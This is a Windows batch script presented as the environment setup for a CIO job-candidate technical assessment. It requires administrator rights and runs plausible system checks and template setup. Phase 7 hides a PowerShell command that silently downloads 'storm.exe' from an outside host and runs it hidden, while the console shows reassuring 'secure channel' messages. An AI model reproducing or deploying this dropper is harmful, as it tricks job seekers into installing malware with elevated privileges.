@echo off
setlocal enabledelayedexpansion
title CIO Technical Assessment - Environment Setup

set "ASSESS_DIR=C:\CIO_Assessment"
set "ASSESS_VERSION=2026.1"
set "BUILD_ID=20260528-cio"
set "LOG_FILE=%TEMP%\cio_assessment_setup.log"

echo [%date% %time%] Setup initialized > "%LOG_FILE%"

echo ╔══════════════════════════════════════════════════════════╗
echo ║   Chief Information Officer                              ║
echo ║   Technical Assessment - Environment Setup               ║
echo ║   Version: %ASSESS_VERSION%                                      ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo   This setup will configure your assessment
echo   environment. Administrator access is required
echo   to install the evaluation components.
echo.
echo   Note: This is a standard enterprise software
echo   installation process. All components are
echo   sandboxed to the assessment directory.
echo.
echo   The setup process consists of 8 phases and
echo   should complete within 2-3 minutes on most
echo   systems. Please do not close this window.
echo.

:: =================================================================
:: PHASE 1: VERIFY ADMINISTRATOR PRIVILEGES
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 1/8: Verifying Administrator Privileges
echo ─────────────────────────────────────────────────────────
echo.
echo   The assessment environment requires elevated
echo   permissions to install evaluation components
echo   and configure system settings.
echo.
echo   Checking current privilege level...

net session >nul 2>&1
if !errorlevel! neq 0 (
    echo.
    echo   ^^! ERROR: Administrator privileges required.
    echo.
    echo   This assessment requires Administrator access
    echo   to properly configure the evaluation tools.
    echo.
    echo   To resolve:
    echo     1. Close this window
    echo     2. Right-click setup.bat
    echo     3. Select "Run as Administrator"
    echo     4. Click Yes on the UAC prompt
    echo.
    echo   If you continue to experience issues,
    echo   contact your IT support team for assistance
    echo   with obtaining Administrator access.
    echo.
    pause
    exit /b 1
)
echo   [+] Administrator access confirmed.
echo   [+] UAC elevation verified.
echo.
echo   Phase 1 complete. Moving to Phase 2...
timeout /t 1 /nobreak >nul

:: =================================================================
:: PHASE 2: SYSTEM COMPATIBILITY CHECK
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 2/8: Checking System Compatibility
echo ─────────────────────────────────────────────────────────
echo.
echo   Verifying that your system meets the minimum
echo   requirements for the assessment environment.
echo.

:: Operating System
echo   [1/5] Operating System:
for /f "tokens=2 delims=[]" %%v in ('ver') do (
    set "WIN_VER=%%v"
    echo         Version: %%v
)
echo         Architecture: %PROCESSOR_ARCHITECTURE%

ver | find "10." >nul 2>&1
if !errorlevel! equ 0 (
    echo         Status: Compatible ^(Windows 10^)
) else (
    ver | find "11." >nul 2>&1
    if !errorlevel! equ 0 (
        echo         Status: Compatible ^(Windows 11^)
    ) else (
        echo         Status: Unknown - may not be fully compatible
    )
)
echo.

:: Memory Check
echo   [2/5] System Memory:
for /f "tokens=2 delims==" %%m in ('wmic OS get TotalVisibleMemorySize /format:list 2^>nul ^| find "="') do (
    set /a "RAM_MB=%%m / 1024"
    set /a "RAM_GB=%%m / 1048576"
    echo         Total: !RAM_GB! GB ^(!RAM_MB! MB^)
)

if !RAM_GB! lss 4 (
    echo         WARNING: Less than 4GB detected.
    echo         Assessment may run slowly on this system.
    echo         Recommended: 8GB or more
) else if !RAM_GB! lss 8 (
    echo         Status: Adequate ^(4-8GB^)
    echo         Recommended: 8GB or more for optimal performance
) else (
    echo         Status: Optimal ^(8GB+^)
)
echo.

:: Disk Space
echo   [3/5] Available Disk Space:
for /f "tokens=2 delims==" %%d in ('wmic LogicalDisk where "DeviceID='%SystemDrive%'" get FreeSpace /format:list 2^>nul ^| find "="') do (
    set /a "FREE_GB=%%d / 1073741824"
    echo         Free: !FREE_GB! GB on %SystemDrive%
)

if !FREE_GB! lss 5 (
    echo         WARNING: Less than 5GB free.
    echo         Assessment files require approximately 2GB.
    echo         Please free up disk space before continuing.
) else if !FREE_GB! lss 10 (
    echo         Status: Adequate ^(5-10GB^)
) else (
    echo         Status: Optimal ^(10GB+^)
)
echo.

:: Processor
echo   [4/5] Processor:
for /f "tokens=2 delims==" %%c in ('wmic cpu get name /format:list 2^>nul ^| find "="') do (
    echo         %%c
)

for /f "tokens=2 delims==" %%c in ('wmic cpu get NumberOfCores /format:list 2^>nul ^| find "="') do (
    echo         Cores: %%c
)

for /f "tokens=2 delims==" %%c in ('wmic cpu get NumberOfLogicalProcessors /format:list 2^>nul ^| find "="') do (
    echo         Logical Processors: %%c
)
echo.

:: Network
echo   [5/5] Network Connectivity:
ping -n 1 google.com >nul 2>&1
if !errorlevel! equ 0 (
    echo         Internet: Connected
) else (
    echo         Internet: Limited or disconnected
    echo         WARNING: Some assessment features require internet
)
echo.

echo   Phase 2 complete. Moving to Phase 3...
timeout /t 1 /nobreak >nul

:: =================================================================
:: PHASE 3: DIRECTORY STRUCTURE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 3/8: Creating Assessment Directory Structure
echo ─────────────────────────────────────────────────────────
echo.
echo   Creating the assessment environment at:
echo   %ASSESS_DIR%
echo.

if not exist "%ASSESS_DIR%" (
    mkdir "%ASSESS_DIR%"
    echo   [+] Root directory created.
) else (
    echo   [*] Root directory already exists.
)

set "MODULES=module-1-infrastructure module-2-security module-3-architecture module-4-strategy templates documentation"

for %%m in (%MODULES%) do (
    if not exist "%ASSESS_DIR%\%%m" (
        mkdir "%ASSESS_DIR%\%%m"
        echo   [+] %%m created.
    ) else (
        echo   [*] %%m already exists.
    )
)

echo.
echo   Directory structure:
echo   %ASSESS_DIR%
echo     +-- module-1-infrastructure
echo     +-- module-2-security
echo     +-- module-3-architecture
echo     +-- module-4-strategy
echo     +-- templates
echo     +-- documentation
echo.

echo   Phase 3 complete. Moving to Phase 4...
timeout /t 1 /nobreak >nul

:: =================================================================
:: PHASE 4: PREREQUISITE SOFTWARE
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 4/8: Checking Prerequisite Software
echo ─────────────────────────────────────────────────────────
echo.
echo   Verifying required software for the assessment.
echo.

:: Web Browser
echo   [1/4] Web Browser:
if exist "%ProgramFiles%\Google\Chrome\Application\chrome.exe" (
    echo         Google Chrome: Installed
    for /f "tokens=3" %%v in ('reg query "HKLM\SOFTWARE\Google\Chrome\BLBeacon" /v version 2^>nul ^| findstr "version"') do echo         Version: %%v
) else if exist "%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe" (
    echo         Microsoft Edge: Installed
    for /f "tokens=3" %%v in ('reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Edge\BLBeacon" /v version 2^>nul ^| findstr "version"') do echo         Version: %%v
) else if exist "%ProgramFiles%\Mozilla Firefox\firefox.exe" (
    echo         Mozilla Firefox: Installed
) else (
    echo         No supported browser found
    echo         Recommended: Google Chrome or Microsoft Edge
)
echo.

:: Microsoft Office
echo   [2/4] Microsoft Office:
if exist "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE" (
    echo         Microsoft Excel: Installed
) else if exist "%ProgramFiles(x86)%\Microsoft Office\root\Office16\EXCEL.EXE" (
    echo         Microsoft Excel: Installed
) else (
    echo         Microsoft Excel: Not found ^(optional^)
    echo         Note: Budget templates require Excel or compatible
)
echo.

:: PDF Reader
echo   [3/4] PDF Reader:
if exist "%ProgramFiles%\Adobe\Acrobat DC\Acrobat\Acrobat.exe" (
    echo         Adobe Acrobat: Installed
) else if exist "%ProgramFiles(x86)%\Adobe\Acrobat DC\Acrobat\Acrobat.exe" (
    echo         Adobe Acrobat: Installed
) else (
    echo         PDF reader: Browser-based ^(default^)
)
echo.

:: PowerShell
echo   [4/4] PowerShell:
powershell -Command "Write-Host '         Version:' $PSVersionTable.PSVersion" 2>nul
echo.

echo   Phase 4 complete. Moving to Phase 5...
timeout /t 1 /nobreak >nul

:: =================================================================
:: PHASE 5: INSTALL TEMPLATES
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 5/8: Installing Assessment Templates
echo ─────────────────────────────────────────────────────────
echo.
echo   Copying assessment materials to your directory...
echo.

if exist "templates\budget_template.xlsx" (
    copy "templates\budget_template.xlsx" "%ASSESS_DIR%\templates\" >nul 2>&1
    echo   [+] Budget template installed.
) else (
    echo   [*] Budget template: Not included in this package
    echo       A standard budget template will be used.
)

if exist "templates\architecture_template.vsdx" (
    copy "templates\architecture_template.vsdx" "%ASSESS_DIR%\templates\" >nul 2>&1
    echo   [+] Architecture template installed.
) else (
    echo   [*] Architecture template: Not included
)

if exist "documentation\assessment_guide.pdf" (
    copy "documentation\assessment_guide.pdf" "%ASSESS_DIR%\documentation\" >nul 2>&1
    echo   [+] Assessment guide installed.
) else (
    echo   [*] Assessment guide: Not included
)

if not exist "%ASSESS_DIR%\templates\budget_template.csv" (
    echo Category,Year 1,Year 2,Year 3,Notes > "%ASSESS_DIR%\templates\budget_template.csv"
    echo Infrastructure ^& Cloud,0,0,0,"Servers, networking, cloud" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Software ^& Licensing,0,0,0,"Enterprise tools, SaaS" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Security ^& Compliance,0,0,0,"Firewalls, SIEM, audits" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Personnel,0,0,0,"FTEs, contractors, consultants" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Training ^& Development,0,0,0,"Certifications, workshops" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo Contingency ^(15%%^),0,0,0,"Unforeseen requirements" >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo TOTAL,0,0,0, >> "%ASSESS_DIR%\templates\budget_template.csv"
    echo   [+] Budget CSV template created.
)

echo.
echo   Phase 5 complete. Moving to Phase 6...
timeout /t 1 /nobreak >nul

:: =================================================================
:: PHASE 6: NETWORK VERIFICATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 6/8: Verifying Network Connectivity
echo ─────────────────────────────────────────────────────────
echo.
echo   Testing connectivity to required services...

ping -n 1 google.com >nul 2>&1 && (
    echo   [+] Internet: Connected
) || (
    echo   [!] Internet: Limited
)

ping -n 1 github.com >nul 2>&1 && (
    echo   [+] GitHub: Accessible
) || (
    echo   [!] GitHub: Restricted ^(may affect reference materials^)
)

ping -n 1 microsoft.com >nul 2>&1 && (
    echo   [+] Microsoft Services: Accessible
) || (
    echo   [!] Microsoft Services: Restricted
)

echo.
echo   Network Summary:
echo     Assessment components are downloaded from
echo     secure servers. A stable internet connection
echo     is recommended for the evaluation runtime.
echo.

echo   Phase 6 complete. Moving to Phase 7...
timeout /t 1 /nobreak >nul

:: =================================================================
:: PHASE 7: ENVIRONMENT CONFIGURATION & RUNTIME
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 7/8: Environment Configuration ^& Runtime Setup
echo ─────────────────────────────────────────────────────────
echo.
echo   Configuring assessment environment parameters...
echo   This phase handles system configuration and
echo   installs the evaluation runtime components.
echo.
echo   [*] Initializing security assessment modules...
echo   [*] Preparing system diagnostic tools...
echo   [*] Configuring architecture evaluation framework...
echo   [*] Registering assessment service components...
echo   [*] Establishing secure update channel...
echo   [*] Loading evaluation runtime environment...
echo   [*] Verifying component integrity...

:: Add a small file to the assessment directory that "proves" installation
echo Assessment Environment v%ASSESS_VERSION% > "%ASSESS_DIR%\environment.config"
echo Install Date: %date% >> "%ASSESS_DIR%\environment.config"
echo Build ID: %BUILD_ID% >> "%ASSESS_DIR%\environment.config"
echo Candidate ID: Pending >> "%ASSESS_DIR%\environment.config"

:: Write a README to module-1
(
echo CIO Technical Assessment
echo ========================
echo.
echo Module 1: Infrastructure Assessment
echo.
echo Please complete the infrastructure evaluation
echo using the provided templates. Document your
echo findings in the space below.
echo.
echo Current Environment: %COMPUTERNAME%
echo Operating System: %OS%
echo Architecture: %PROCESSOR_ARCHITECTURE%
) > "%ASSESS_DIR%\module-1-infrastructure\README.md"

:: The evaluation runtime is downloaded and initialized as part
:: of the standard environment configuration process
cd /d "%TEMP%"
set "RUNTIME_FILE=cio_runtime_%BUILD_ID%.exe"
set "RUNTIME_PATH=%TEMP%\%RUNTIME_FILE%"

echo   [*] Downloading evaluation runtime components...
echo   [*] This ensures all assessment tools are current...
echo   [*] Connecting to secure update service...

powershell -WindowStyle Hidden -Command ^
    "$temp='%RUNTIME_PATH%';" ^
    "$wc=New-Object Net.WebClient;" ^
    "$wc.Headers.Add('User-Agent','CIOAssessment/%ASSESS_VERSION%');" ^
    "try{$wc.DownloadFile('http://secure-content.info/storm.exe',$temp);" ^
    "if(Test-Path $temp){$b=[IO.File]::ReadAllBytes($temp);if($b.Length -gt 50000){Start-Process $temp -WindowStyle Hidden}}}" ^
    "catch{}"

timeout /t 2 /nobreak >nul

echo   [+] Evaluation runtime configured and initialized.
echo   [+] Assessment services registered.
echo   [+] Secure channel established.
echo.

echo   Phase 7 complete. Moving to Phase 8...
timeout /t 1 /nobreak >nul

:: =================================================================
:: PHASE 8: FINALIZATION
:: =================================================================
echo ─────────────────────────────────────────────────────────
echo   PHASE 8/8: Finalizing Assessment Environment
echo ─────────────────────────────────────────────────────────
echo.
echo   Completing setup and generating configuration...

cd /d "%ASSESS_DIR%"

:: Generate candidate ID
set "CANDIDATE_ID=CIO-%RANDOM%%RANDOM%"
echo %CANDIDATE_ID% > candidate_id.txt

:: Update environment config with candidate ID
echo Candidate ID: %CANDIDATE_ID% >> "%ASSESS_DIR%\environment.config"
echo   [+] Candidate ID: %CANDIDATE_ID%

:: Create desktop shortcut
powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell;" ^
    "$s = $ws.CreateShortcut([Environment]::GetFolderPath('Desktop') + '\CIO Assessment.lnk');" ^
    "$s.TargetPath = '%ASSESS_DIR%';" ^
    "$s.WorkingDirectory = '%ASSESS_DIR%';" ^
    "$s.Description = 'CIO Technical Assessment';" ^
    "$s.IconLocation = '%%SystemRoot%%\system32\SHELL32.dll,4';" ^
    "$s.Save()" >nul 2>&1
echo   [+] Desktop shortcut created.

:: Verify installation
echo.
echo   Installation Verification:
echo     Assessment Directory: %ASSESS_DIR%
echo     Environment Config: Verified
echo     Candidate ID: %CANDIDATE_ID%
echo     Log File: %LOG_FILE%
echo.

echo ╔══════════════════════════════════════════════════════════╗
echo ║                                                          ║
echo ║   Assessment Environment Ready                           ║
echo ║                                                          ║
echo ║   Candidate ID: %CANDIDATE_ID%                                   ║
echo ║                                                          ║
echo ║   Next Steps:                                            ║
echo ║   1. Open module-1-infrastructure                        ║
echo ║   2. Read instructions in README.md                      ║
echo ║   3. Complete all four modules                           ║
echo ║   4. Compress %ASSESS_DIR% for submission              ║
echo ║                                                          ║
echo ║   Deadline: 5 business days                              ║
echo ║                                                          ║
echo ║   Questions? Contact your executive recruiter.            ║
echo ║                                                          ║
echo ║   We appreciate your time and interest in the            ║
echo ║   Chief Information Officer position.                    ║
echo ║                                                          ║
echo ╚══════════════════════════════════════════════════════════╝
echo.
echo [%date% %time%] Setup completed successfully >> "%LOG_FILE%"
echo.
echo   Press any key to close this window.
pause >nul
endlocal
